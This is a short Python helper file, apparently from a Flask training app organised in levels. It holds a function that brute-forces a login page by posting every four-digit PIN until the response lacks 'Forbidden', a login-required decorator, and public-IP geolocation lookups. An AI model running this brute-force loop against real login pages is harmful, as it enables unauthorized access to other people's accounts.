# Bruteforce
from string import ascii_letters, digits, punctuation
from itertools import product
import requests

# Level3 required
from flask import redirect, render_template, session
from functools import wraps



# Function that sends a request to a login page
def send_request(url, username, password):
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    return response


# Function that performs a Bruteforce attack against a login page
def bruteforce(url, username):
    for passcode in product(digits, repeat=4):
        passcode = "".join(passcode)
        response = send_request(url, username, passcode)
        if response.text.find("Forbidden") == -1:
            print(f"The correct password is: {passcode}")
            break

def login_required(f):
    """
    Decorate routes to require level2.

    http://flask.pocoo.org/docs/0.12/patterns/viewdecorators/
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get("user_id") is None:
            return redirect("/")
        return f(*args, **kwargs)
    return decorated_function


# Function that provides geolocalization
def get_ip():
    response = requests.get('https://api.ipify.org?format=json').json()
    return response["ip"]


def get_location():
    ip_address = get_ip()
    response = requests.get(f'http://ip-api.com/json/{ip_address}').json()
    return response
